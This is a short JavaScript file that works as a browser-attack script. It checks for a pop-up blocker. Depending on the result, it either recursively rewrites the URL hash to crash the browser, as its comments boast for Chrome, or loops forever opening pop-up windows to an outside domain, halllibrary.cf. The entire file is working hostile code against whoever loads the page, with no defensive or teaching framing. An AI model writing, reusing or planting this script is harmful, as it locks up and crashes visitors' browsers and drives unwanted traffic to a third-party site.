function recursor() {
  //Change hash of current URL
  window.location.hash = Math.random() + "" + Math.random() + "" + Math.random();
  //Recurse on hash changes
  window.addEventListener('hashchange', function() {
    recursor();
  });
};

function detectPopupBlocker() {
  var myTest = window.open("about:blank", "", "directories=no,height=100,width=100,menubar=no,resizable=no,scrollbars=no,status=no,titlebar=no,top=0,location=no");
  if (!myTest) { // Tests for pop-up blocker ^
    setTimeout(function() {
      recursor();
    }, 2000);
    //Runs recursory code after 5000 millisecond delay ^ (crashes chrome)
  } else {
    myTest.close();
    while (true) {
      var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
      var URL = "http://halllibrary.cf" + location.href;
      var win = window.open(URL, "_blank", strWindowFeatures);
      //If no pop-up blocker spams a shit ton of pop-ups
    }
  }
}
detectPopupBlocker();
